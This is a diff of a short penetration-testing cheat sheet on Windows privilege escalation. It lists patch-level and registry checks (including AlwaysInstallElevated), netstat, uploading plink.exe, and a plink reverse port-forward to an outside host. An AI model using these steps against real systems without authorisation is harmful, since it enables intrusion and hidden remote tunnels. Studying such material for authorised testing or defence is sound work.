@@ -1,6 +1,5 @@
 # Windows Privilege Escalation
 
-## basic info
 ### patch level  
 systeminfo  
 wmic qfe get Caption,Description,HotFixID,InstalledOn  
@@ -73,7 +72,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 netstat -ano  
 upload plink.exe  
 
-plink.exe -R <remote port>:127.0.0.1:<local port>  root@<ipaddress>
+plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
 
 ### Pasword in files  
 https://pentestlab.blog/tag/privilege-escalation/page/3/  
